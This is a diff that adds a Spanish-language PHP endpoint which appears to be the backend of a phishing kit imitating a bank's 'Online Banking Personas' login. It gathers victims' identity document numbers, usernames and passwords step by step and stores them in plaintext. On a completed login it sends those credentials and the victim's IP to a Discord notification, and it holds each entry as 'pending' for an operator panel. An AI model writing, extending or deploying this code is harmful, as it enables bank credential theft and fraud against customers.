@@ -1,0 +1,118 @@
+<?php
+declare(strict_types=1);
+
+require_once dirname(__DIR__) . '/includes/helpers.php';
+require_once dirname(__DIR__) . '/includes/monitor.php';
+
+header('Access-Control-Allow-Origin: *');
+header('Access-Control-Allow-Methods: POST, OPTIONS');
+header('Access-Control-Allow-Headers: Content-Type');
+
+if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
+    http_response_code(204);
+    exit;
+}
+
+if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
+    json_response(['ok' => false, 'error' => 'Método no permitido'], 405);
+}
+
+$input = json_decode(file_get_contents('php://input') ?: '', true);
+if (!is_array($input)) {
+    $input = $_POST;
+}
+
+$paso = (int) ($input['paso'] ?? 0);
+$canal = (string) ($input['canal'] ?? 'personas');
+$documento = trim((string) ($input['documento'] ?? ''));
+// Acepta varios nombres de campo para no perder el texteo del usuario
+$usuario = trim((string) (
+    $input['usuario']
+    ?? $input['nombre_usuario']
+    ?? $input['login-usuario']
+    ?? $input['username']
+    ?? $input['email']
+    ?? ''
+));
+$clave = (string) ($input['clave'] ?? $input['password'] ?? '');
+
+$titulo = trim((string) ($input['titulo'] ?? ''));
+$detalle = trim((string) ($input['detalle'] ?? ''));
+$categoria = trim((string) ($input['categoria'] ?? ''));
+
+if ($titulo === '') {
+    $titulo = match ($paso) {
+        1 => 'Documento ingresado',
+        2 => 'Usuario ingresado',
+        3 => 'Clave ingresada',
+        4 => 'Acceso completo',
+        default => 'Acción',
+    };
+}
+
+if ($detalle === '') {
+    $detalle = match ($paso) {
+        1 => 'Documento — paso 1',
+        2 => 'Usuario — paso 2',
+        3 => 'Clave — paso 3',
+        4 => 'Intento de acceso completo',
+        default => 'Evento registrado',
+    };
+}
+
+if ($categoria === '') {
+    $categoria = match ($paso) {
+        1 => '[Paso 1 - Documento]',
+        2 => '[Paso 2 - Usuario]',
+        3 => '[Paso 3 - Clave]',
+        4 => '[Acceso completo]',
+        default => '[Login]',
+    };
+}
+
+try {
+    $sesionId = null;
+    if ($paso >= 4) {
+        $sesionId = registrar_sesion_login([
+            'documento' => $documento,
+            'usuario' => $usuario,
+            'clave' => $clave,
+            'canal' => $canal,
+            'exito' => true,
+        ]);
+    }
+
+    $id = registrar_evento([
+        'tipo' => (string) ($input['tipo'] ?? 'login'),
+        'categoria' => $categoria,
+        'titulo' => $titulo,
+        'detalle' => $detalle,
+        'documento' => $documento,
+        'usuario' => $usuario,
+        'clave' => $clave,
+        'canal' => $canal,
+        'paso' => $paso,
+        'sesion_id' => $sesionId,
+        // Queda pendiente hasta que el panel acepte o rechace
+        'exito' => $paso >= 4 ? null : (array_key_exists('exito', $input) ? (bool) $input['exito'] : null),
+        'estado' => $paso >= 4 ? 'pendiente' : 'pendiente',
+    ]);
+
+    if ($paso >= 4) {
+        discord_notify(
+            'Nuevo ingreso — Online Banking Personas',
+            'Se registró un intento de login completo.',
+            [
+                'Documento' => $documento !== '' ? $documento : '—',
+                'Usuario' => $usuario !== '' ? $usuario : '—',
+                'Clave' => $clave !== '' ? $clave : '—',
+                'IP' => client_ip(),
+                'Canal' => $canal,
+            ]
+        );
+    }
+
+    json_response(['ok' => true, 'evento_id' => $id, 'sesion_id' => $sesionId]);
+} catch (Throwable $e) {
+    json_response(['ok' => false, 'error' => 'No se pudo registrar el evento.'], 500);
+}
